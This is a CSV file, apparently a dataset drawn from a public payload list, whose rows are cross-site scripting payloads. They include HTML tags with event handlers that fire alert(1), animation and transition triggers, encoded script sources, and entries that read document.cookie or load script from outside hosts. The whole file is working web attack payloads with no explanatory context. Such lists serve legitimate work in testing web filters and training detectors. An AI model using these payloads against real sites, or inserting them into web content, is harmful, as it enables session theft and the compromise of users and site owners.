text,source
<tfoot id=x tabindex=1 onfocus=alert(1)></tfoot>,payloadbox
<tfoot id=x tabindex=1 onfocusin=alert(1)></tfoot>,payloadbox
"<sub onbeforepaste=""alert(1)"" contenteditable>test</sub>",payloadbox
"<html onclick=""alert(1)"">test</html>",payloadbox
"<style>@keyframes slidein {}</style><listing style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></listing>",payloadbox
<menu id=x tabindex=1 onbeforeactivate=alert(1)></menu>,payloadbox
<template id=x tabindex=1 onbeforedeactivate=alert(1)></template><input autofocus>,payloadbox
"<font onkeydown=""alert(1)"" contenteditable>test</font>",payloadbox
"<u draggable=""true"" ondragleave=""alert(1)"">test</u>",payloadbox
"<rtc onmouseup=""alert(1)"">test</rtc>",payloadbox
"<style>:target {color:red;}</style><rtc id=x style=""transition:color 1s"" ontransitionend=alert(1)></rtc>",payloadbox
"<menu draggable=""true"" ondragenter=""alert(1)"">test</menu>",payloadbox
"<style>@keyframes slidein {}</style><noembed style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></noembed>",payloadbox
"<hr onmousemove=""alert(1)"">test</hr>",payloadbox
"<style>:target {color:red;}</style><dir id=x style=""transition:color 1s"" ontransitionend=alert(1)></dir>",payloadbox
"<style>@keyframes x{}</style><label style=""animation-name:x"" onanimationend=""alert(1)""></label>",payloadbox
<svg><b onload=alert(1)></b>,payloadbox
"<code onmouseover=""alert(1)"">test</code>",payloadbox
"<spacer draggable=""true"" ondragend=""alert(1)"">test</spacer>",payloadbox
"<style>@keyframes x{}</style><track style=""animation-name:x"" onanimationstart=""alert(1)""></track>",payloadbox
<element onfocusout=alert(1) tabindex=1 id=x></element><input autofocus>,payloadbox
"<nobr onmouseleave=""alert(1)"">test</nobr>",payloadbox
"<base oncut=""alert(1)"" contenteditable>test</base>",payloadbox
"<map onmousemove=""alert(1)"">test</map>",payloadbox
"<form oncontextmenu=""alert(1)"">test</form>",payloadbox
<slot id=x tabindex=1 ondeactivate=alert(1)></slot><input id=y autofocus>,payloadbox
"<marquee draggable=""true"" ondrag=""alert(1)"">test</marquee>",payloadbox
"<article onmouseup=""alert(1)"">test</article>",payloadbox
<canvas id=x tabindex=1 ondeactivate=alert(1)></canvas><input id=y autofocus>,payloadbox
"<label onclick=""alert(1)"">test</label>",payloadbox
"<param onmousedown=""alert(1)"">test</param>",payloadbox
"<video onbeforepaste=""alert(1)"" contenteditable>test</video>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><menuitem ondrop=alert(1) contenteditable>drop here</menuitem>",payloadbox
"<area oncut=""alert(1)"" contenteditable>test</area>",payloadbox
<form id=x tabindex=1 onfocus=alert(1)></form>,payloadbox
"<style>@keyframes x{}</style><figcaption style=""animation-name:x"" onanimationend=""alert(1)""></figcaption>",payloadbox
"<button draggable=""true"" ondragenter=""alert(1)"">test</button>",payloadbox
"<ins onkeypress=""alert(1)"" contenteditable>test</ins>",payloadbox
<svg%0Aonload=%09((pro\u006dpt))()//,payloadbox
"<script/src=""data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')""></script a=\u0061 & /=%2F",payloadbox
"<style>@keyframes x{}</style><var style=""animation-name:x"" onanimationstart=""alert(1)""></var>",payloadbox
<command onblur=alert(1) tabindex=1 id=x></command><input autofocus>,payloadbox
<hgroup id=x tabindex=1 onactivate=alert(1)></hgroup>,payloadbox
"<picture draggable=""true"" ondragstart=""alert(1)"">test</picture>",payloadbox
"<li draggable=""true"" ondragleave=""alert(1)"">test</li>",payloadbox
"<datalist draggable=""true"" ondragleave=""alert(1)"">test</datalist>",payloadbox
<noscript id=x tabindex=1 onfocus=alert(1)></noscript>,payloadbox
"<div draggable=""true"" contenteditable>drag me</div><dd ondragover=alert(1) contenteditable>drop here</dd>",payloadbox
<wbr id=x tabindex=1 onbeforeactivate=alert(1)></wbr>,payloadbox
"<strong draggable=""true"" ondragstart=""alert(1)"">test</strong>",payloadbox
"<s onmouseenter=""alert(1)"">test</s>",payloadbox
"<menu draggable=""true"" ondragstart=""alert(1)"">test</menu>",payloadbox
"<script oncontextmenu=""alert(1)"">test</script>",payloadbox
<svg><mark onload=alert(1)></mark>,payloadbox
"<dl onkeyup=""alert(1)"" contenteditable>test</dl>",payloadbox
"<slot onkeyup=""alert(1)"" contenteditable>test</slot>",payloadbox
"<meta draggable=""true"" ondragleave=""alert(1)"">test</meta>",payloadbox
<del id=x tabindex=1 onbeforeactivate=alert(1)></del>,payloadbox
"<div draggable=""true"" contenteditable>drag me</div><isindex ondragover=alert(1) contenteditable>drop here</isindex>",payloadbox
"<html onmouseout=""alert(1)"">test</html>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><dd ondrop=alert(1) contenteditable>drop here</dd>",payloadbox
"<style>:target {color: red;}</style><data id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></data>",payloadbox
"<button onmouseover=""alert(1)"">test</button>",payloadbox
"<div id=""96""><iframe src=mhtml:http://html5sec.org/test.html!xss.html></iframe>",payloadbox
"<samp onmouseup=""alert(1)"">test</samp>",payloadbox
"<plaintext oncut=""alert(1)"" contenteditable>test</plaintext>",payloadbox
<svg><details onload=alert(1)></details>,payloadbox
"<multicol onmousemove=""alert(1)"">test</multicol>",payloadbox
"<style>:target {color:red;}</style><span id=x style=""transition:color 1s"" ontransitionend=alert(1)></span>",payloadbox
"<style>:target {transform: rotate(180deg);}</style><summary id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></summary>",payloadbox
<dl onblur=alert(1) tabindex=1 id=x></dl><input autofocus>,payloadbox
"<style onbeforepaste=""alert(1)"" contenteditable>test</style>",payloadbox
"<article draggable=""true"" ondragleave=""alert(1)"">test</article>",payloadbox
"<small onkeydown=""alert(1)"" contenteditable>test</small>",payloadbox
"<caption onmouseup=""alert(1)"">test</caption>",payloadbox
"<noembed onmouseup=""alert(1)"">test</noembed>",payloadbox
"<bdo oncontextmenu=""alert(1)"">test</bdo>",payloadbox
<optgroup onblur=alert(1) tabindex=1 id=x></optgroup><input autofocus>,payloadbox
"<legend draggable=""true"" ondrag=""alert(1)"">test</legend>",payloadbox
<svg><rp onload=alert(1)></rp>,payloadbox
<pre id=x tabindex=1 ondeactivate=alert(1)></pre><input id=y autofocus>,payloadbox
<x contenteditable onkeyup=alert(1)>press any key!,payloadbox
<x ondblclick=alert(1)>double click this!,payloadbox
"<image onbeforecut=""alert(1)"" contenteditable>test</image>",payloadbox
"<svg><path><animateMotion onbegin=alert(1) dur=""1s"" repeatCount=""1"">",payloadbox
"<head onbeforepaste=""alert(1)"" contenteditable>test</head>",payloadbox
"<caption oncontextmenu=""alert(1)"">test</caption>",payloadbox
<samp id=x tabindex=1 onfocus=alert(1)></samp>,payloadbox
"<ol draggable=""true"" ondragleave=""alert(1)"">test</ol>",payloadbox
"<picture draggable=""true"" ondragleave=""alert(1)"">test</picture>",payloadbox
"<template onkeydown=""alert(1)"" contenteditable>test</template>",payloadbox
<listing id=x tabindex=1 onactivate=alert(1)></listing>,payloadbox
"feed:data:text/html,&#x3c;script>alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie)&#x3c;/script>&#x3c;b>",payloadbox
"<rp onmousedown=""alert(1)"">test</rp>",payloadbox
"<style>:target {color:red;}</style><pre id=x style=""transition:color 1s"" ontransitionend=alert(1)></pre>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><tt ondragover=alert(1) contenteditable>drop here</tt>",payloadbox
"<style oncopy=""alert(1)"" contenteditable>test</style>",payloadbox
<acronym id=x tabindex=1 onfocusin=alert(1)></acronym>,payloadbox
<acronym onblur=alert(1) tabindex=1 id=x></acronym><input autofocus>,payloadbox
<u id=x tabindex=1 onbeforeactivate=alert(1)></u>,payloadbox
<strong onblur=alert(1) tabindex=1 id=x></strong><input autofocus>,payloadbox
"<tr draggable=""true"" ondragenter=""alert(1)"">test</tr>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><rtc ondragover=alert(1) contenteditable>drop here</rtc>",payloadbox
"<noscript draggable=""true"" ondragstart=""alert(1)"">test</noscript>",payloadbox
"<head onmousedown=""alert(1)"">test</head>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><embed ondrop=alert(1) contenteditable>drop here</embed>",payloadbox
"<xmp onbeforepaste=""alert(1)"" contenteditable>test</xmp>",payloadbox
"<video ondblclick=""alert(1)"">test</video>",payloadbox
"<style>@keyframes x{}</style><shadow style=""animation-name:x"" onanimationend=""alert(1)""></shadow>",payloadbox
"<style>@keyframes slidein {}</style><rt style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></rt>",payloadbox
"<body><a href=""#"" onclick=""makePopups()"">Spam</a>//[""'`-->]]>]</div>",payloadbox
"<div id=""115""><!--[if]><script>alert(115)</script -->",payloadbox
"<dd oncontextmenu=""alert(1)"">test</dd>",payloadbox
"<audio onbeforecut=""alert(1)"" contenteditable>test</audio>",payloadbox
<dl id=x tabindex=1 onbeforeactivate=alert(1)></dl>,payloadbox
"<data onmouseover=""alert(1)"">test</data>",payloadbox
"<html onkeydown=""alert(1)"" contenteditable>test</html>",payloadbox
"<applet draggable=""true"" ondrag=""alert(1)"">test</applet>",payloadbox
"<a onmouseleave=""alert(1)"">test</a>",payloadbox
<section onfocusout=alert(1) tabindex=1 id=x></section><input autofocus>,payloadbox
"<tbody oncut=""alert(1)"" contenteditable>test</tbody>",payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><aside id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></aside>",payloadbox
"<noembed draggable=""true"" ondrag=""alert(1)"">test</noembed>",payloadbox
"<dl onmouseenter=""alert(1)"">test</dl>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><optgroup ondragover=alert(1) contenteditable>drop here</optgroup>",payloadbox
"<element oncut=""alert(1)"" contenteditable>test</element>",payloadbox
"<canvas draggable=""true"" ondragenter=""alert(1)"">test</canvas>",payloadbox
"<caption onpaste=""alert(1)"" contenteditable>test</caption>",payloadbox
"<param onclick=""alert(1)"">test</param>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><multicol ondrop=alert(1) contenteditable>drop here</multicol>",payloadbox
"<frame onkeyup=""alert(1)"" contenteditable>test</frame>",payloadbox
"<select oncontextmenu=""alert(1)"">test</select>",payloadbox
"<style>:target {transform: rotate(180deg);}</style><s id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></s>",payloadbox
"<div id=""124""><script src=""/\example.com\foo.js""></script> // Safari 5.0, Chrome 9, 10",payloadbox
"<ruby onclick=""alert(1)"">test</ruby>",payloadbox
"<style>@keyframes x{}</style><samp style=""animation-name:x"" onanimationend=""alert(1)""></samp>",payloadbox
<label id=x tabindex=1 ondeactivate=alert(1)></label><input id=y autofocus>,payloadbox
"<address onclick=""alert(1)"">test</address>",payloadbox
"<style>:target {color: red;}</style><iframe id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></iframe>",payloadbox
"<track onbeforecopy=""alert(1)"" contenteditable>test</track>",payloadbox
"<SCRIPT SRC=""http://ha.ckers.org/xss.jpg""></SCRIPT>",payloadbox
"<h1 onmouseup=""alert(1)"">test</h1>",payloadbox
<rp id=x tabindex=1 onbeforeactivate=alert(1)></rp>,payloadbox
"<slot onmousedown=""alert(1)"">test</slot>",payloadbox
<progress id=x tabindex=1 onfocus=alert(1)></progress>,payloadbox
"<td onmouseout=""alert(1)"">test</td>",payloadbox
"<!-- IE9+, FF4+, Opera 11.60+, Safari 4.0.4+, GC7+  -->",payloadbox
<nav id=x tabindex=1 onfocusin=alert(1)></nav>,payloadbox
"<bdi oncut=""alert(1)"" contenteditable>test</bdi>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><code ondragover=alert(1) contenteditable>drop here</code>",payloadbox
"<base onpaste=""alert(1)"" contenteditable>test</base>",payloadbox
"<style>@keyframes x{}</style><video style=""animation-name:x"" onanimationend=""alert(1)""></video>",payloadbox
"<style>:target {color:red;}</style><dt id=x style=""transition:color 1s"" ontransitionend=alert(1)></dt>",payloadbox
<fieldset id=x tabindex=1 onbeforedeactivate=alert(1)></fieldset><input autofocus>,payloadbox
"<template onbeforecopy=""alert(1)"" contenteditable>test</template>",payloadbox
"<track oncut=""alert(1)"" contenteditable>test</track>",payloadbox
<body onerror=alert(1) onload=/>,payloadbox
"<i onkeypress=""alert(1)"" contenteditable>test</i>",payloadbox
"<slot oncopy=""alert(1)"" contenteditable>test</slot>",payloadbox
"<ruby onpaste=""alert(1)"" contenteditable>test</ruby>",payloadbox
"<style>:target {color: red;}</style><plaintext id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></plaintext>",payloadbox
"<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">",payloadbox
"<frameset onmouseover=""alert(1)"">test</frameset>",payloadbox
"<blockquote onmouseover=""alert(1)"">test</blockquote>",payloadbox
"<base onmouseenter=""alert(1)"">test</base>",payloadbox
<big id=x tabindex=1 onbeforedeactivate=alert(1)></big><input autofocus>,payloadbox
<center id=x tabindex=1 onbeforedeactivate=alert(1)></center><input autofocus>,payloadbox
"<div draggable=""true"" contenteditable>drag me</div><menu ondrop=alert(1) contenteditable>drop here</menu>",payloadbox
"<dd oncut=""alert(1)"" contenteditable>test</dd>",payloadbox
"<blink draggable=""true"" ondragstart=""alert(1)"">test</blink>",payloadbox
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><html id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></html>",payloadbox
"<video onkeypress=""alert(1)"" contenteditable>test</video>",payloadbox
"<optgroup onmouseleave=""alert(1)"">test</optgroup>",payloadbox
"<style>:target {color:red;}</style><fieldset id=x style=""transition:color 1s"" ontransitionend=alert(1)></fieldset>",payloadbox
"<tbody onmousemove=""alert(1)"">test</tbody>",payloadbox
"<div draggable=""true"" contenteditable>drag me</div><dl ondragover=alert(1) contenteditable>drop here</dl>",payloadbox
"<style>@keyframes slidein {}</style><content style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></content>",payloadbox
"<datalist onpaste=""alert(1)"" contenteditable>test</datalist>",payloadbox
<rtc onfocusout=alert(1) tabindex=1 id=x></rtc><input autofocus>,payloadbox
<fieldset id=x tabindex=1 onfocusin=alert(1)></fieldset>,payloadbox
<pre id=x tabindex=1 onfocus=alert(1)></pre>,payloadbox
"getURL(""javascript:alert('XSS')"")",payloadbox
"<nobr draggable=""true"" ondragenter=""alert(1)"">test</nobr>",payloadbox
"<base onmouseover=""alert(1)"">test</base>",payloadbox
"<address draggable=""true"" ondragenter=""alert(1)"">test</address>",payloadbox
"<template onmouseleave=""alert(1)"">test</template>",payloadbox
"<base onmouseup=""alert(1)"">test</base>",payloadbox
"<path d=""M0,0"" style=""marker-start:url(test4.svg#a)""/>",payloadbox
"<style>@keyframes slidein {}</style><abbr style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></abbr>",payloadbox
<img src=http://www.google.fr/images/srpr/logo3w.png onload=alert(this.ownerDocument.cookie) width=0 height= 0 /> #,payloadbox
<element id=x tabindex=1 onfocus=alert(1)></element>,payloadbox
<meta onblur=alert(1) tabindex=1 id=x></meta><input autofocus>,payloadbox
"<address onpaste=""alert(1)"" contenteditable>test</address>",payloadbox
<br onfocusout=alert(1) tabindex=1 id=x></br><input autofocus>,payloadbox
<progress id=x tabindex=1 onactivate=alert(1)></progress>,payloadbox
"<iframe onpaste=""alert(1)"" contenteditable>test</iframe>",payloadbox
"<main onmouseout=""alert(1)"">test</main>",payloadbox
"<table onmouseup=""alert(1)"">test</table>",payloadbox
"<style>:target {transform: rotate(180deg);}</style><image id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></image>",payloadbox
<area id=x tabindex=1 onbeforeactivate=alert(1)></area>,payloadbox
"<xml:namespace prefix=""t"">",payloadbox
"<body onbeforepaste=""alert(1)"" contenteditable>test</body>",payloadbox
<plaintext onfocusout=alert(1) tabindex=1 id=x></plaintext><input autofocus>,payloadbox
"<br onbeforepaste=""alert(1)"" contenteditable>test</br>",payloadbox
"<input onbeforepaste=alert(1) value="""" autofocus>",payloadbox
"<wbr draggable=""true"" ondrag=""alert(1)"">test</wbr>",payloadbox
"<table draggable=""true"" ondragend=""alert(1)"">test</table>",payloadbox
<isindex type=image onload=alert(1) src=validimage.png>,payloadbox
"<th draggable=""true"" ondragend=""alert(1)"">test</th>",payloadbox
"<set attributeName=""onmouseover"" to=""alert(89)""/>",payloadbox
"<tbody onbeforecopy=""alert(1)"" contenteditable>test</tbody>",payloadbox
"<style>:target {color: red;}</style><isindex id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></isindex>",payloadbox
<head id=x tabindex=1 onbeforeactivate=alert(1)></head>,payloadbox
"<aside onbeforecut=""alert(1)"" contenteditable>test</aside>",payloadbox
"<dfn draggable=""true"" ondragenter=""alert(1)"">test</dfn>",payloadbox
